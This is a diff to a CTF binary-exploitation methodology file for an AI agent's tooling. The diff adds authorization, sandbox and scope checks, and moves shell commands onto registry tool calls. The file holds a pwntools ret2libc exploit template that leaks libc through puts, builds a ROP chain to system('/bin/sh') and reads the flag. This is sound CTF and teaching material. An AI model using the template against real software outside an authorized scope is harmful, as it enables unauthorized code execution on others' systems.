@@ -5,33 +5,34 @@ description: Use when solving binary exploitation / pwn CTF challenges — buffe
 
 # CTF pwn methodology
 
-## 0. Pwntools venv
+> **Pre-flight.** Confirm the event rules allow AI assistance (`authorization-gate`). Start with `suggest_for_ctf` or `guided_assessment`. Commands below are CLI notation: run them with `run_tool`/`run_pipeline` using registry names (`list_tools`), and `run_script` only for real logic. If policy blocks a command, tell the operator; do not fall back to the client shell. A tool that is not in the registry is a recommendation to the user (approval-gated install), not a bare command.
 
-The MCP server runs pwntools through a dedicated venv at `~/.ctf-venvs/pwntools/`. If missing:
+## 0. Pwntools
+
+`./install.sh --module pwn` installs pwntools through pipx. `run_script` is disabled unless the operator sets `CYBERSEC_MCP_ALLOW_SCRIPTS=1`, and it carries no scope policy, so scope stays the operator's responsibility there.
+
+For `run_script(code, venv="pwntools")`, the operator creates the venv (not governed by the installer; installs need user approval):
 
 ```bash
-wsl.exe bash -lc "mkdir -p ~/.ctf-venvs && python3 -m venv ~/.ctf-venvs/pwntools && ~/.ctf-venvs/pwntools/bin/pip install pwntools z3-solver"
+python3 -m venv "${CYBERSEC_MCP_VENVS_DIR:-$HOME/.ctf-venvs}/pwntools"
+"${CYBERSEC_MCP_VENVS_DIR:-$HOME/.ctf-venvs}/pwntools/bin/pip" install pwntools z3-solver
 ```
-
-Then use it: `run_script(code, venv="pwntools")`.
 
 ## 1. Identify the binary
 
-```bash
-file ./vuln
-checksec --file=./vuln       # or: rabin2 -I ./vuln
-strings ./vuln | head -50
-nm ./vuln | head -30          # symbols if not stripped
+```text
+run_tool("file", "./vuln")
+run_tool("checksec", "--file=./vuln")
+run_pipeline([{"tool": "strings", "args": "./vuln"}, {"tool": "head", "args": "-50"}])
+run_pipeline([{"tool": "nm", "args": "./vuln"}, {"tool": "head", "args": "-30"}])   # symbols if not stripped
 ```
 
 Note: `RELRO`, `Canary`, `NX`, `PIE`, arch (x86 / x86_64 / arm / mips), libc version.
 
 If a libc is provided, identify it:
 
-```bash
-strings libc.so.6 | grep "GNU C Library"
-# or
-./vuln_pwntools_helper  # see below
+```text
+run_pipeline([{"tool": "strings", "args": "libc.so.6"}, {"tool": "grep", "args": "GNU C Library"}])
 ```
 
 `libc-database` and `libc-rip`/`libc.rip` (web) — find offsets by leaked function addresses.
@@ -41,12 +42,12 @@ strings libc.so.6 | grep "GNU C Library"
 Static:
 
 - `objdump -d -M intel ./vuln`
-- Ghidra / `cutter` (radare2 GUI) for decompile — both in registry
+- Ghidra / `cutter` (radare2 GUI) for decompile; check `list_tools` before relying on them
 - Look for: `gets`, `strcpy`, unbounded `read`, `printf(user_input)`, integer overflow on size, double free, UAF
 
 Dynamic:
 
-- `gdb-multiarch ./vuln` + `pwndbg` / `gef`
+- `gdb ./vuln` (or `gdb-multiarch`) with `pwndbg` / `gef` if installed; debugging launches the sample, so do it only inside the sandbox/VM (`docs/SANDBOX.md`)
 - Cyclic pattern: `cyclic 200` → run → crash → `cyclic -l <RIP>` to find offset
 
 ## 3. Pick the primitive
@@ -67,9 +68,9 @@ Dynamic:
 ```python
 from pwn import *
 
-context.binary = ELF("./vuln")
+elf = context.binary = ELF("./vuln")
 libc = ELF("./libc.so.6")
-p = remote("host", 1337)  # or process("./vuln") for local
+p = process("./vuln")  # remote("host", 1337) only when the host is in scope
 
 # leak
 p.sendlineafter(b"> ", b"A" * 40 + p64(elf.plt['puts']) + p64(elf.sym['main']))
@@ -81,8 +82,8 @@ rop = ROP(libc)
 rop.raw(rop.find_gadget(['ret']))  # stack align
 rop.system(next(libc.search(b"/bin/sh")))
 p.sendline(b"A" * 40 + rop.chain())
-
-p.interactive()
+p.sendline(b"cat flag*")  # run_script is non-interactive: no p.interactive()
+print(p.recvall(timeout=3))
 ```
 
 ## 5. Heap (glibc)
